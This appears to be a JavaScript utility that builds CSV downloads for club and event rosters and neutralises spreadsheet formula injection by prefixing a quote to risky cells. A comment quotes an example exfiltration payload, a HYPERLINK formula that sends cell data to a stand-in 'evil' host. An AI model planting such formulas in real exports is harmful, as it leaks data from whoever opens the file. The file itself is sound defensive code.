/**
 * CSV EXPORT
 *
 * Shared "build a CSV and trigger a browser download" helper -- Excel opens
 * a .csv file natively, so this covers both "export as CSV" and "export as
 * Excel" asks without a spreadsheet-writing dependency. Used anywhere a
 * dashboard needs to hand someone a roster/registration list (club members,
 * club applications, event rosters, ...).
 */

// CSV/Excel "formula injection" (CWE-1236): a cell whose text starts with
// =, +, -, @, or a tab/CR is evaluated as a formula by Excel/Sheets when the
// file is opened, even though it's plain double-quoted CSV text -- quoting
// only defends against CSV parsing, not spreadsheet formula evaluation.
// Several of this app's exports (club-application "message" in particular)
// are unprivileged-user-controlled free text, so a crafted application
// message like `=HYPERLINK("http://evil/steal?"&A1)` would run in the
// exporting club leader's spreadsheet. Standard mitigation (OWASP, used by
// GitHub's own CSV exports): prefix a bare `'` on any such cell -- that
// makes the cell start with a quote character instead of a formula
// trigger, which spreadsheet apps then render as inert literal text.
function neutralizeFormula(value) {
  const s = String(value ?? "");
  return /^[=+\-@\t\r]/.test(s) ? `'${s}` : s;
}

export function downloadCsv(filename, header, rows) {
  const csv = [header, ...rows]
    .map((row) => row.map((cell) => `"${neutralizeFormula(cell).replace(/"/g, '""')}"`).join(","))
    .join("\n");
  // Leading BOM so Excel (which sniffs encoding rather than assuming UTF-8)
  // renders non-ASCII names/USNs correctly instead of mangling them.
  const blob = new Blob(["﻿" + csv], { type: "text/csv;charset=utf-8;" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  a.remove();
  URL.revokeObjectURL(url);
}
